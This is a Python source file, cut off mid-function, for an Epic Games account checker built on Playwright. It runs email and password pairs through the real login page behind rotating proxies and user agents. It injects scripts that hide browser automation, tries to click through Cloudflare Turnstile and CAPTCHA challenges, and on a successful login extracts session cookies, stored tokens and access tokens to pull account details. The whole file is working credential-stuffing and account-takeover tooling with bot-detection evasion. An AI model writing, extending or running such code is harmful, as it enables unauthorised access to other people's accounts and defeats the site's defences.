"""
Epic Games headless browser-based account checker
Replaces API-based authentication with Playwright browser automation
"""
import asyncio
import random
import time
from typing import List, Tuple, Dict, Optional, Any
from enum import Enum
from urllib.parse import urlparse
from playwright.async_api import async_playwright, Browser, BrowserContext, Page
from .epic_api_client import EpicAPIClient, EpicWebAPIClient
from config.settings import (
    LOGIN_URL, 
    HEADLESS, 
    NAVIGATION_TIMEOUT, 
    MAX_CONCURRENT_CHECKS, 
    REQUEST_TIMEOUT,
    BLOCK_RESOURCE_TYPES,
    BROWSER_SLOWMO
)

class AccountStatus(Enum):
    VALID = "valid"
    INVALID = "invalid"
    CAPTCHA = "captcha"
    TWO_FA = "2fa"
    ERROR = "error"

class AccountCheckerCF:
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.playwright = None
        self.browser_pool: Dict[str, Browser] = {}
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
        
        # Updated user agents matching Chrome 128 (current version)
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
        ]
        self.user_agent_index = 0
    
    async def __aenter__(self):
        """Initialize Playwright and browser pool"""
        self.playwright = await async_playwright().start()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Clean up browsers and Playwright"""
        # Close all browsers in the pool
        for browser in self.browser_pool.values():
            try:
                await browser.close()
            except:
                pass
        
        if self.playwright:
            await self.playwright.stop()
    
    def get_next_user_agent(self) -> str:
        """Get next user agent for rotation"""
        user_agent = self.user_agents[self.user_agent_index]
        self.user_agent_index = (self.user_agent_index + 1) % len(self.user_agents)
        return user_agent
    
    def parse_proxy_for_playwright(self, proxy_line: str) -> Optional[Dict[str, str]]:
        """Parse proxy string into Playwright proxy format"""
        if not proxy_line:
            return None
        
        try:
            # Handle different proxy formats
            if '://' not in proxy_line:
                # Default to HTTP if no scheme specified
                proxy_line = f"http://{proxy_line}"
            
            parsed = urlparse(proxy_line)
            scheme = parsed.scheme.lower()
            
            # Handle SOCKS5 with authentication issue
            # Chromium doesn't support SOCKS5 proxy authentication, so convert to HTTP
            if scheme == 'socks5' and parsed.username and parsed.password:
                print(f"⚠️ SOCKS5 with auth not supported by Chromium, converting to HTTP")
                scheme = "http"
            elif scheme not in ['http', 'https', 'socks5']:
                print(f"⚠️ Unsupported proxy scheme '{scheme}', defaulting to http")
                scheme = "http"
            
            proxy_dict = {
                "server": f"{scheme}://{parsed.hostname}:{parsed.port}"
            }
            
            # Add authentication if provided and supported
            if parsed.username and parsed.password:
                if scheme in ['http', 'https']:
                    proxy_dict["username"] = parsed.username
                    proxy_dict["password"] = parsed.password
                elif scheme == 'socks5':
                    print(f"⚠️ SOCKS5 authentication not supported, proxy may not work")
            
            print(f"🔧 Parsed proxy: {scheme}://{parsed.hostname}:{parsed.port} (auth: {'yes' if parsed.username and scheme != 'socks5' else 'no'})")
            return proxy_dict
            
        except Exception as e:
            print(f"❌ Error parsing proxy {proxy_line}: {e}")
            return None
    
    async def get_or_launch_browser(self, proxy_line: Optional[str]) -> Browser:
        """Get or launch browser for the given proxy"""
        proxy_key = proxy_line or "__noproxy__"
        
        if proxy_key in self.browser_pool:
            return self.browser_pool[proxy_key]
        
        # Parse proxy
        proxy_dict = None
        if proxy_line:
            proxy_dict = self.parse_proxy_for_playwright(proxy_line)
        
        # Launch browser with comprehensive stealth options
        browser_args = [
            # Core stealth arguments
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-accelerated-2d-canvas",
            "--no-first-run",
            "--no-zygote",
            "--disable-gpu",
            
            # Hide automation flags
            "--disable-blink-features=AutomationControlled",
            "--disable-automation",
            "--disable-extensions",
            "--disable-plugins",
            "--disable-default-apps",
            "--disable-component-extensions-with-background-pages",
            
            # Performance and stealth
            "--disable-background-timer-throttling",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
            "--disable-features=TranslateUI,VizDisplayCompositor",
            "--disable-ipc-flooding-protection",
            "--disable-background-networking",
            "--disable-sync",
            "--metrics-recording-only",
            "--no-report-upload",
            "--disable-web-security",
            
            # Hide headless indicators
            "--disable-field-trial-config",
            "--disable-back-forward-cache",
            "--disable-client-side-phishing-detection",
            "--disable-component-update",
            "--no-default-browser-check",
            "--disable-breakpad",
            "--allow-pre-commit-input",
            "--disable-hang-monitor",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--force-color-profile=srgb",
            "--password-store=basic",
            "--use-mock-keychain",
            "--no-service-autorun",
            "--export-tagged-pdf",
            "--disable-search-engine-choice-screen",
            
            # User agent (will be overridden in context)
            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        ]
        
        browser = await self.playwright.chromium.launch(
            headless=HEADLESS,
            proxy=proxy_dict,
            args=browser_args,
            slow_mo=BROWSER_SLOWMO
        )
        
        self.browser_pool[proxy_key] = browser
        return browser
    
    async def new_context(self, browser: Browser) -> BrowserContext:
        """Create new browser context with rotating user agents and proper stealth settings"""
        user_agent = self.get_next_user_agent()
        print(f"🔄 Using User Agent: {user_agent[:50]}...")
        
        context = await browser.new_context(
            user_agent=user_agent,
            viewport={"width": 1920, "height": 1080},
            locale="en-US",
            timezone_id="America/New_York",
            extra_http_headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                # Override client hints to hide headless chrome
                "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Ch-Ua-Platform-Version": '"15.0.0"'
            }
        )
        
        # Comprehensive stealth scripts
        await context.add_init_script("""
            // Hide webdriver property completely
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // Remove automation indicators
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
            
            // Mock realistic plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => ({
                    length: 3,
                    0: { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    1: { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    2: { name: 'Native Client', filename: 'internal-nacl-plugin' }
                }),
                configurable: true
            });
            
            // Mock languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
                configurable: true
            });
            
            // Mock permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: 'default' }) :
                    originalQuery(parameters)
            );
            
            // Mock chrome object with realistic properties
            window.chrome = {
                runtime: {
                    onConnect: undefined,
                    onMessage: undefined
                },
                loadTimes: function() {
                    return {
                        commitLoadTime: Date.now() / 1000 - Math.random(),
                        finishDocumentLoadTime: Date.now() / 1000 - Math.random(),
                        finishLoadTime: Date.now() / 1000 - Math.random(),
                        firstPaintAfterLoadTime: 0,
                        firstPaintTime: Date.now() / 1000 - Math.random(),
                        navigationType: 'Other',
                        npnNegotiatedProtocol: 'h2',
                        requestTime: Date.now() / 1000 - Math.random(),
                        startLoadTime: Date.now() / 1000 - Math.random(),
                        wasAlternateProtocolAvailable: false,
                        wasFetchedViaSpdy: true,
                        wasNpnNegotiated: true
                    };
                },
                csi: function() {
                    return {
                        pageT: Date.now(),
                        startE: Date.now(),
                        tran: 15
                    };
                },
                app: {
                    isInstalled: false
                }
            };
            
            // Override screen properties with realistic values
            Object.defineProperty(screen, 'colorDepth', {get: () => 24, configurable: true});
            Object.defineProperty(screen, 'pixelDepth', {get: () => 24, configurable: true});
            Object.defineProperty(screen, 'availWidth', {get: () => 1920, configurable: true});
            Object.defineProperty(screen, 'availHeight', {get: () => 1040, configurable: true});
            
            // Mock battery API
            Object.defineProperty(navigator, 'getBattery', {
                get: () => () => Promise.resolve({
                    charging: true,
                    chargingTime: 0,
                    dischargingTime: Infinity,
                    level: 1
                }),
                configurable: true
            });
            
            // Hide automation in toString
            const originalToString = Function.prototype.toString;
            Function.prototype.toString = function() {
                if (this === navigator.webdriver) {
                    return 'function webdriver() { [native code] }';
                }
                return originalToString.apply(this, arguments);
            };
            
            // Mock connection
            Object.defineProperty(navigator, 'connection', {
                get: () => ({
                    effectiveType: '4g',
                    rtt: 50,
                    downlink: 10
                }),
                configurable: true
            });
            
            // Override Date to add some randomness
            const originalDate = Date;
            Date = class extends originalDate {
                constructor(...args) {
                    if (args.length === 0) {
                        super(originalDate.now() + Math.floor(Math.random() * 10));
                    } else {
                        super(...args);
                    }
                }
                static now() {
                    return originalDate.now() + Math.floor(Math.random() * 10);
                }
            };
        """)
        
        return context
    
    async def handle_cloudflare_challenge(self, page: Page, email: str):
        """Handle Cloudflare Turnstile and other challenges by clicking verification elements"""
        try:
            # List of possible Cloudflare challenge selectors
            challenge_selectors = [
                # Turnstile checkbox
                "iframe[src*='challenges.cloudflare.com'] >> input[type='checkbox']",
                "iframe[src*='turnstile'] >> input[type='checkbox']",
                "[data-sitekey] iframe >> input[type='checkbox']",
                
                # Turnstile clickable areas
                "iframe[src*='challenges.cloudflare.com']",
                "iframe[src*='turnstile']",
                "[data-sitekey] iframe",
                
                # Direct challenge elements
                ".cf-turnstile",
                ".cf-challenge-container",
                "[data-cf-challenge]",
                
                # Challenge buttons
                "button:has-text('Verify')",
                "button:has-text('I am human')",
                "button:has-text('Continue')",
                "input[type='button'][value*='Verify']",
                
                # Checkbox-style challenges
                "input[type='checkbox'][name*='cf-']",
                "input[type='checkbox'][id*='challenge']",
                
                # Click areas near challenge text
                "text=Verify you are human",
                "text=I'm not a robot",
                "text=Please verify",
            ]
            
            print(f"🤖 {email} - Attempting to interact with Cloudflare challenge...")
            
            # Try each selector type
            for selector in challenge_selectors:
                try:
                    elements = page.locator(selector)
                    count = await elements.count()
                    
                    if count > 0:
                        print(f"🎯 {email} - Found challenge element: {selector}")
                        
                        # Add human-like delay before interaction
                        await asyncio.sleep(random.uniform(1, 3))
                        
                        # Move mouse to element area first
                        try:
                            box = await elements.first.bounding_box()
                            if box:
                                # Move to center of element with slight randomness
                                center_x = box['x'] + box['width'] / 2 + random.randint(-10, 10)
                                center_y = box['y'] + box['height'] / 2 + random.randint(-5, 5)
                                await page.mouse.move(center_x, center_y)
                                await asyncio.sleep(random.uniform(0.5, 1.5))
                        except:
                            # Fallback to random mouse movement
                            await page.mouse.move(
                                random.randint(300, 700), 
                                random.randint(200, 500)
                            )
                            await asyncio.sleep(random.uniform(0.5, 1))
                        
                        # Try different interaction methods
                        interaction_success = False
                        
                        # Method 1: Direct click
                        try:
                            await elements.first.click(timeout=5000)
                            print(f"✅ {email} - Clicked challenge element successfully")
                            interaction_success = True
                        except Exception as click_error:
                            print(f"⚠️ {email} - Direct click failed: {click_error}")
                        
                        # Method 2: Force click if direct click failed
                        if not interaction_success:
                            try:
                                await elements.first.click(force=True, timeout=5000)
                                print(f"✅ {email} - Force clicked challenge element")
                                interaction_success = True
                            except Exception as force_error:
                                print(f"⚠️ {email} - Force click failed: {force_error}")
                        
                        # Method 3: JavaScript click if other methods failed
                        if not interaction_success:
                            try:
                                await elements.first.evaluate("element => element.click()")
                                print(f"✅ {email} - JavaScript clicked challenge element")
                                interaction_success = True
                            except Exception as js_error:
                                print(f"⚠️ {email} - JavaScript click failed: {js_error}")
                        
                        if interaction_success:
                            # Wait for challenge to process
                            print(f"⏳ {email} - Waiting for challenge to process...")
                            await asyncio.sleep(random.uniform(2, 5))
                            
                            # Check if challenge was resolved
                            try:
                                title = await page.title()
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                    print(f"🎉 {email} - Challenge appears to be resolved!")
                                    return True
                            except:
                                pass
                            
                            # Additional wait for slower challenges
                            await asyncio.sleep(random.uniform(1, 3))
                            return True
                        
                except Exception as selector_error:
                    # Continue to next selector if this one fails
                    continue
            
            # Enhanced iframe-based approach for Turnstile
            print(f"🔍 {email} - Trying enhanced iframe-based challenge interaction...")
            
            # Look for all iframes, including Turnstile-specific ones
            iframe_selectors = [
                "iframe[src*='challenges.cloudflare.com']",
                "iframe[src*='turnstile']",
                "iframe[data-sitekey]",
                "div[data-sitekey] iframe",
                ".cf-turnstile iframe",
                "iframe"  # Fallback to all iframes
            ]
            
            for selector in iframe_selectors:
                try:
                    iframes = page.locator(selector)
                    iframe_count = await iframes.count()
                    
                    if iframe_count > 0:
                        print(f"🎯 {email} - Found {iframe_count} iframe(s) with selector: {selector}")
                        
                        for i in range(iframe_count):
                            try:
                                iframe = iframes.nth(i)
                                
                                # Get iframe source and check if it's Cloudflare related
                                src = await iframe.get_attribute("src") or ""
                                data_sitekey = await iframe.get_attribute("data-sitekey") or ""
                                
                                is_cf_iframe = any(indicator in src.lower() for indicator in ['cloudflare', 'turnstile']) or data_sitekey
                                
                                if is_cf_iframe or selector == "iframe":  # Try all iframes as fallback
                                    print(f"🎯 {email} - Attempting to interact with iframe: {src[:50] if src else 'no src'}...")
                                    
                                    # Method 1: Click on iframe area
                                    try:
                                        box = await iframe.bounding_box()
                                        if box and box['width'] > 0 and box['height'] > 0:
                                            # Calculate click position (slightly offset from center)
                                            click_x = box['x'] + box['width'] * 0.3  # Left side of checkbox area
                                            click_y = box['y'] + box['height'] * 0.5  # Middle height
                                            
                                            print(f"🖱️ {email} - Clicking iframe at ({click_x:.0f}, {click_y:.0f})")
                                            
                                            # Human-like mouse movement
                                            await page.mouse.move(click_x - 50, click_y - 20)
                                            await asyncio.sleep(random.uniform(0.3, 0.7))
                                            await page.mouse.move(click_x, click_y)
                                            await asyncio.sleep(random.uniform(0.2, 0.5))
                                            
                                            # Click
                                            await page.mouse.click(click_x, click_y)
                                            print(f"✅ {email} - Clicked on Cloudflare iframe")
                                            
                                            # Wait for processing
                                            await asyncio.sleep(random.uniform(3, 6))
                                            
                                            # Check if challenge resolved
                                            try:
                                                title = await page.title()
                                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                                    print(f"🎉 {email} - Challenge resolved after iframe click!")
                                                    return True
                                            except:
                                                pass
                                            
                                            return True  # Consider it handled even if we can't verify
                                            
                                    except Exception as iframe_error:
                                        print(f"⚠️ {email} - Iframe click failed: {iframe_error}")
                                        continue
                                    
                                    # Method 2: Try to focus and interact with iframe content
                                    try:
                                        await iframe.focus()
                                        await asyncio.sleep(random.uniform(0.5, 1))
                                        
                                        # Try pressing space or enter
                                        await page.keyboard.press("Space")
                                        await asyncio.sleep(random.uniform(1, 2))
                                        
                                        print(f"✅ {email} - Attempted keyboard interaction with iframe")
                                        return True
                                        
                                    except Exception as keyboard_error:
                                        print(f"⚠️ {email} - Keyboard interaction failed: {keyboard_error}")
                                        continue
                                        
                            except Exception as iframe_iteration_error:
                                print(f"⚠️ {email} - Error processing iframe {i}: {iframe_iteration_error}")
                                continue
                                
                except Exception as selector_error:
                    print(f"⚠️ {email} - Error with selector {selector}: {selector_error}")
                    continue
            
            print(f"⚠️ {email} - No interactive challenge elements found")
            return False
            
        except Exception as e:
            print(f"❌ {email} - Error in challenge handler: {e}")
            return False
    
    async def setup_page_blocking(self, page: Page):
        """Setup resource blocking for performance"""
        async def route_handler(route):
            if route.request.resource_type in BLOCK_RESOURCE_TYPES:
                await route.abort()
            else:
                await route.continue_()
        
        await page.route("**/*", route_handler)
    
    async def wait_for_any_selector(self, page: Page, selectors: List[str], timeout: int = 5000) -> Optional[str]:
        """Wait for any of the given selectors to appear"""
        try:
            for selector in selectors:
                try:
                    await page.wait_for_selector(selector, timeout=timeout)
                    return selector
                except:
                    continue
            return None
        except:
            return None
    
    async def fill_if_present(self, page: Page, selectors: List[str], value: str) -> bool:
        """Fill input if any of the selectors is present"""
        for selector in selectors:
            try:
                element = page.locator(selector).first
                if await element.is_visible(timeout=2000):
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def click_if_present(self, page: Page, selectors: List[str]) -> bool:
        """Click element if any of the selectors is present"""
        for selector in selectors:
            try:
                element = page.locator(selector).first
                if await element.is_visible(timeout=2000):
                    await element.click()
                    return True
            except:
                continue
        return False
    
    async def detect_outcome_and_extract_auth(self, page: Page, email: str) -> Tuple[AccountStatus, Dict[str, Any]]:
        """Detect login outcome and extract auth code if successful"""
        try:
            # Wait for page to stabilize
            await asyncio.sleep(3)
            
            current_url = page.url
            page_content = await page.content()
            
            print(f"🔍 {email} - Analyzing page: {current_url}")
            
            # Success detection - Epic Games redirects to account page or shows account info
            success_urls = [
                "/account",
                "account.epicgames.com",
                "/id/account",
                "epicgames.com/account"
            ]
            
            if any(url in current_url for url in success_urls):
                print(f"✅ {email} - Success detected by URL: {current_url}")
                auth_code = await self.extract_auth_code(page, email)
                
                # Fetch detailed account information using auth code
                account_details = await self.fetch_account_details(auth_code, page, email)
                
                return AccountStatus.VALID, {
                    'message': 'Login successful',
                    'auth_code': auth_code,
                    'account_url': current_url,
                    **account_details
                }
            
            # Check for account-related elements and text
            success_indicators = [
                "Sign Out",
                "Account Settings",
                "Profile",
                "My Account",
                "Epic Games Account",
                "Account Overview"
            ]
            
            page_text = page_content.lower()
            for indicator in success_indicators:
                if indicator.lower() in page_text:
                    print(f"✅ {email} - Success detected by content: {indicator}")
                    auth_code = await self.extract_auth_code(page, email)
                    
                    # Fetch detailed account information using auth code
                    account_details = await self.fetch_account_details(auth_code, page, email)
                    
                    return AccountStatus.VALID, {
                        'message': f'Login successful - {indicator} found',
                        'auth_code': auth_code,
                        'account_url': current_url,
                        **account_details
                    }
            
            # 2FA detection
            twofa_indicators = [
                "two-factor",
                "security code",
                "verification code",
                "authenticator",
                "email code",
                "enter the code",
                "authentication code"
            ]
            
            for indicator in twofa_indicators:
                if indicator in page_text:
                    print(f"🔐 {email} - 2FA detected: {indicator}")
                    return AccountStatus.TWO_FA, {
                        'message': f'2FA required - {indicator}',
                        'error': '2FA authentication needed'
                    }
            
            # Captcha detection (including Cloudflare challenges)
            try:
                # Check for various captcha types
                captcha_checks = [
                    ("iframe[src*='hcaptcha.com']", "hCaptcha"),
                    ("iframe[src*='arkoselabs']", "Arkose Labs"),
                    ("iframe[src*='recaptcha']", "reCAPTCHA"),
                    ("[class*='captcha' i]", "Generic captcha"),
                    ("input[name='cf-turnstile-response']", "Cloudflare Turnstile"),
                    (".cf-challenge", "Cloudflare challenge")
                ]
                
                for selector, captcha_type in captcha_checks:
                    count = await page.locator(selector).count()
                    if count > 0:
                        print(f"🤖 {email} - Captcha detected: {captcha_type}")
                        return AccountStatus.CAPTCHA, {
                            'message': f'{captcha_type} required',
                            'error': f'Captcha challenge: {captcha_type}'
                        }
            except:
                pass
            
            # Invalid credentials detection
            invalid_indicators = [
                "invalid credentials",
                "incorrect password",
                "wrong password",
                "authentication failed",
                "login failed",
                "invalid email",
                "account not found",
                "password is incorrect"
            ]
            
            for indicator in invalid_indicators:
                if indicator in page_text:
                    print(f"❌ {email} - Invalid credentials detected: {indicator}")
                    return AccountStatus.INVALID, {
                        'message': f'Invalid credentials - {indicator}',
                        'error': 'Invalid email or password'
                    }
            
            # Check for error elements
            try:
                error_selectors = [
                    "[role='alert']",
                    ".error",
                    ".alert-danger",
                    "[class*='error' i]",
                    "[data-testid*='error' i]",
                    ".MuiAlert-message"
                ]
                
                for selector in error_selectors:
                    error_elements = await page.locator(selector).count()
                    if error_elements > 0:
                        error_text = await page.locator(selector).first.text_content()
                        if error_text:
                            error_lower = error_text.lower()
                            if any(word in error_lower for word in ["credential", "invalid", "incorrect", "password", "email"]):
                                print(f"❌ {email} - Error element detected: {error_text[:100]}")
                                return AccountStatus.INVALID, {
                                    'message': f'Login error: {error_text[:100]}',
                                    'error': error_text[:200]
                                }
            except:
                pass
            
            # Check if still on login page (login failed)
            if "/login" in current_url or "login" in page_text:
                print(f"❌ {email} - Still on login page, likely invalid credentials")
                return AccountStatus.INVALID, {
                    'message': 'Login failed - still on login page',
                    'error': 'Credentials appear to be invalid'
                }
            
            # Default to error if we can't determine the outcome
            print(f"⚠️ {email} - Unable to determine outcome, URL: {current_url}")
            return AccountStatus.ERROR, {
                'message': 'Unable to determine login outcome',
                'error': f'Unexpected page state: {current_url}'
            }
            
        except Exception as e:
            print(f"❌ {email} - Error in outcome detection: {str(e)}")
            return AccountStatus.ERROR, {
                'message': f'Detection error: {str(e)}',
                'error': str(e)
            }
    
    async def extract_auth_code(self, page: Page, email: str) -> Optional[str]:
        """Extract authentication code/token for further Epic Games API calls"""
        try:
            print(f"🔑 {email} - Attempting to extract auth code...")
            
            # Try to extract from cookies
            cookies = await page.context.cookies()
            for cookie in cookies:
                # Look for Epic Games auth tokens
                if cookie['name'] in ['EPIC_BEARER_TOKEN', 'EPIC_SESSION_AP', 'EPIC_SESSION', 'epic_session']:
                    print(f"🔑 {email} - Found auth token in cookies: {cookie['name']}")
                    return cookie['value']
            
            # Try to extract from localStorage
            try:
                local_storage = await page.evaluate("""
                    () => {
                        const storage = {};
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            if (key && (key.includes('epic') || key.includes('auth') || key.includes('token'))) {
                                storage[key] = localStorage.getItem(key);
                            }
                        }
                        return storage;
                    }
                """)
                
                if local_storage:
                    print(f"🔑 {email} - Found auth data in localStorage: {list(local_storage.keys())}")
                    # Return the first auth-related item
                    for key, value in local_storage.items():
                        if value and len(value) > 10:  # Basic validation
                            return value
            except:
                pass
            
            # Try to extract from page URL or redirects
            current_url = page.url
            if "access_token=" in current_url:
                import re
                token_match = re.search(r'access_token=([^&]+)', current_url)
                if token_match:
                    print(f"🔑 {email} - Found access token in URL")
                    return token_match.group(1)
            
            # Try to wait for and extract from network requests
            try:
                # This is a placeholder for more advanced token extraction
                # In a real implementation, you might intercept network requests
                # to capture auth tokens from API calls
                pass
            except:
                pass
            
            print(f"⚠️ {email} - No auth code found, but login was successful")
            return None
            
        except Exception as e:
            print(f"❌ {email} - Error extracting auth code: {str(e)}")
            return None
    
    async def fetch_account_details(self, auth_code: Optional[str], page: Page, email: str) -> Dict[str, Any]:
        """
        Fetch detailed account information using auth code or session cookies
        Returns detailed account info including cosmetics and stats
        """
        try:
            if not auth_code:
                print(f"⚠️ {email} - No auth code available, trying cookie-based approach...")
                return await self._fetch_details_via_cookies(page, email)
            
            print(f"🔍 {email} - Fetching detailed account info using auth code...")
            
            # Try API-based approach first
            async with EpicAPIClient() as api_client:
                success, details = await api_client.get_account_details(auth_code, email)
                if success:
                    print(f"✅ {email} - Account details fetched via API")
                    return details
                else:
                    print(f"⚠️ {email} - API approach failed: {details.get('error', 'Unknown error')}")
            
            # Fallback to cookie-based approach
            return await self._fetch_details_via_cookies(page, email)
            
        except Exception as e:
            print(f"❌ {email} - Error fetching account details: {str(e)}")
            return {'profile_error': f'Failed to fetch details: {str(e)}'}
    
    async def _fetch_details_via_cookies(self, page: Page, email: str) -> Dict[str, Any]:
        """
        Fallback method: Extract account details using browser session cookies
        """
        try:
            print(f"🍪 {email} - Attempting cookie-based account details extraction...")
            
            # Get all cookies from the browser
            cookies = await page.context.cookies()
            cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
            
            # Try web API approach
            async with EpicWebAPIClient() as web_client:
                success, details = await web_client.get_account_details_from_cookies(cookie_dict, email)
                if success:
                    print(f"✅ {email} - Account details fetched via cookies")
                    return details
                else:
                    print(f"⚠️ {email} - Cookie approach failed: {details.get('error', 'Unknown error')}")
            
            # If both methods fail, return basic success info
            return {
                'message': 'Login successful but detailed info unavailable',
                'login_method': 'browser_session',
                'cookies_available': len(cookie_dict) > 0
            }
            
        except Exception as e:
            print(f"❌ {email} - Error with cookie-based extraction: {str(e)}")
            return {'profile_error': f'Cookie extraction failed: {str(e)}'}
    
    async def check_account(self, email: str, password: str, proxy: str = None) -> Tuple[AccountStatus, Dict[str, Any]]:
        """Check Epic Games account using headless browser"""
        async with self.semaphore:
            print(f"🔍 Checking Epic Games account: {email}")
            
            # Use provided proxy or get from proxy pool
            if proxy:
                print(f"🌐 {email} - Using provided proxy: {proxy[:20]}...")
                proxy_str = proxy
            elif self.proxies:
                proxy_str = self.proxies[hash(email) % len(self.proxies)]
                print(f"🌐 {email} - Using pool proxy: {proxy_str[:20]}...")
                proxy = proxy_str
            else:
                print(f"🚫 {email} - No proxies uploaded, using direct connection")
                proxy_str = None
            
            context = None
            try:
                # Get or launch browser
                browser = await self.get_or_launch_browser(proxy_str)
                
                # Create new context
                context = await self.new_context(browser)
                page = await context.new_page()
                
                # Set timeouts
                page.set_default_navigation_timeout(NAVIGATION_TIMEOUT)
                page.set_default_timeout(NAVIGATION_TIMEOUT)
                
                # Setup resource blocking
                await self.setup_page_blocking(page)
                
                # Navigate to login page with human-like behavior
                print(f"🌐 {email} - Navigating to login page...")
                
                # Add random delay before navigation (1-3 seconds)
                await asyncio.sleep(random.uniform(1, 3))
                
                # Navigate with proper wait conditions
                await page.goto(LOGIN_URL, wait_until="networkidle", timeout=30000)
                
                # Human-like mouse movement
                await page.mouse.move(random.randint(100, 500), random.randint(100, 400))
                
                # Wait for page to fully load with random timing
                await asyncio.sleep(random.uniform(2, 5))
                
                # Enhanced Cloudflare bypass attempt
                try:
                    # Wait for potential Cloudflare challenge to appear and resolve
                    print(f"🔍 {email} - Checking for security challenges...")
                    
                    # First, try to immediately handle any visible challenges
                    challenge_handled = await self.handle_cloudflare_challenge(page, email)
                    if challenge_handled:
                        print(f"🎉 {email} - Initial challenge handled successfully!")
                        await asyncio.sleep(random.uniform(2, 4))
                    
                    # Check for Cloudflare challenge indicators
                    cf_indicators = [
                        "input[name='cf-turnstile-response']",  # Turnstile
                        ".cf-challenge-container",              # Challenge container
                        ".cf-challenge",                        # Challenge section
                        "iframe[src*='challenges.cloudflare.com']",  # Challenge iframe
                        "title:has-text('Just a moment')",     # Cloudflare page title
                        "h1:has-text('One more step')",        # Cloudflare heading
                        "text=Please complete a security check", # Cloudflare text
                        "text=Checking your browser",          # Browser check text
                        ".lds-ring"                             # Loading spinner
                    ]
                    
                    challenge_detected = False
                    for selector in cf_indicators:
                        try:
                            count = await page.locator(selector).count()
                            if count > 0:
                                print(f"🤖 {email} - Security challenge detected ({selector}), attempting bypass...")
                                challenge_detected = True
                                break
                        except:
                            continue
                    
                    # If challenge detected, wait for it to resolve
                    if challenge_detected:
                        print(f"⏳ {email} - Waiting for challenge to resolve...")
                        
                        challenge_resolved = False
                        # Wait up to 45 seconds for challenge to resolve
                        for attempt in range(45):
                            await asyncio.sleep(1)
                            
                            # Check page title first
                            try:
                                title = await page.title()
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                                    challenge_resolved = True
                                    print(f"✅ {email} - Challenge resolved (title check)!")
                                    break
                            except:
                                pass
                            
                            # Check if we're now on the login page
                            current_url = page.url.lower()
                            if 'login' in current_url and 'epicgames.com' in current_url:
                                # Double check title to make sure
                                try:
                                    title = await page.title()
                                    if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                        challenge_resolved = True
                                        print(f"✅ {email} - Challenge bypassed successfully!")
                                        break
                                except:
                                    pass
                            
                            # Check if challenge elements are still present
                            still_challenged = False
                            for selector in cf_indicators[:3]:  # Check only main indicators
                                try:
                                    if await page.locator(selector).count() > 0:
                                        still_challenged = True
                                        break
                                except:
                                    continue
                            
                            if not still_challenged:
                                challenge_resolved = True
                                print(f"✅ {email} - Challenge resolved (element check)!")
                                break
                            
                            # Try to interact with Cloudflare challenge
                            try:
                                await self.handle_cloudflare_challenge(page, email)
                            except Exception as cf_error:
                                print(f"⚠️ {email} - Error handling Cloudflare challenge: {cf_error}")
                                pass
                        
                        if not challenge_resolved:
                            # Challenge didn't resolve in time
